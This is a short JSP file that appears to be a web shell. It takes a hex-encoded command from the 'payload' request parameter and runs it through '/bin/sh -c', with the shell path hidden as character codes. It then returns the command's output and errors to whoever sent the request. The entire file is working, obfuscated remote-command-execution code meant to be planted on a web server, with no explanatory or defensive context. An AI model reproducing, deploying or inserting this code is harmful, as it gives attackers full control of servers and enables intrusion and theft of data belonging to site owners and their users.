<%@ page import="java.util.*,java.io.*" %><%
String h = request.getParameter("payload");
String ts = request.getParameter("t");
if (h != null) {
  int t = ts != null ? Integer.parseInt(ts) : 30;
  StringBuilder cs = new StringBuilder();
  for (int i = 0; i + 1 < h.length(); i += 2) {
    cs.append((char) Integer.parseInt(h.substring(i, i + 2), 16));
  }
  String c = cs.toString();
  Process p = new ProcessBuilder(
      new String[]{new String(new char[]{0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68}), "-c", c}
  ).start();
  InputStream a = p.getInputStream();
  InputStream g = p.getErrorStream();
  byte[] b = new byte[8192];
  int n;
  StringBuilder sb = new StringBuilder();
  long end = System.currentTimeMillis() + t * 1000L;
  while (System.currentTimeMillis() < end) {
    if (a.available() > 0) { n = a.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
    else if (g.available() > 0) { n = g.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
    else {
      try { p.exitValue(); break; }
      catch (IllegalThreadStateException e2) {
        try { Thread.sleep(40); } catch (Exception e3) {}
      }
    }
  }
  while (a.available() > 0) { n = a.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
  while (g.available() > 0) { n = g.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
  out.print("R:" + sb.toString());
}
%>
